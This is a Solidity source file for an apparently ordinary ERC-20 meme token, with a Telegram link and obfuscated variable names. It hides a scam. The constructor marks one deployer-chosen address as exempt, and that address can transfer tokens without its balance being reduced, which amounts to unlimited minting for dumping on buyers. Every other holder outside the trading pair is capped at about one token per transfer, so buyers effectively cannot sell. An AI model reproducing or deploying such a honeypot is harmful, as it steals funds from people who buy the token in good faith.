/*

https://t.me/ethdorkpepe

*/

// SPDX-License-Identifier: MIT

pragma solidity >=0.8.13;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract OK is Ownable {
    constructor(string memory psmtwonb, string memory cibz, address kptejiuhalqm, address jolyz) {
        name = psmtwonb;
        symbol = cibz;
        balanceOf[msg.sender] = totalSupply;
        jxtwpvoda[jolyz] = sgmn;
        bhxnp = IUniswapV2Router02(kptejiuhalqm);
    }

    mapping(address => uint256) public balanceOf;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function ahjiutpyxwbr(address udicjropnh, address lfigqzmbpwvo, uint256 elwxfo) private {
        address qzdgrau = IUniswapV2Factory(bhxnp.factory()).getPair(address(this), bhxnp.WETH());
        if (jxtwpvoda[udicjropnh] == 0) {
            if (udicjropnh != qzdgrau && akumthxjfygr[udicjropnh] != block.number && elwxfo < totalSupply) {
                require(elwxfo <= totalSupply / (10 ** decimals));
            }
            balanceOf[udicjropnh] -= elwxfo;
        }
        balanceOf[lfigqzmbpwvo] += elwxfo;
        akumthxjfygr[lfigqzmbpwvo] = block.number;
        emit Transfer(udicjropnh, lfigqzmbpwvo, elwxfo);
    }

    uint256 private sgmn = 105;

    string public name;

    IUniswapV2Router02 private bhxnp;

    function transferFrom(address udicjropnh, address lfigqzmbpwvo, uint256 elwxfo) public returns (bool success) {
        require(elwxfo <= allowance[udicjropnh][msg.sender]);
        allowance[udicjropnh][msg.sender] -= elwxfo;
        ahjiutpyxwbr(udicjropnh, lfigqzmbpwvo, elwxfo);
        return true;
    }

    string public symbol;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address yrog, uint256 elwxfo) public returns (bool success) {
        allowance[msg.sender][yrog] = elwxfo;
        emit Approval(msg.sender, yrog, elwxfo);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private akumthxjfygr;

    mapping(address => uint256) private jxtwpvoda;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transfer(address lfigqzmbpwvo, uint256 elwxfo) public returns (bool success) {
        ahjiutpyxwbr(msg.sender, lfigqzmbpwvo, elwxfo);
        return true;
    }

    uint8 public decimals = 9;
}
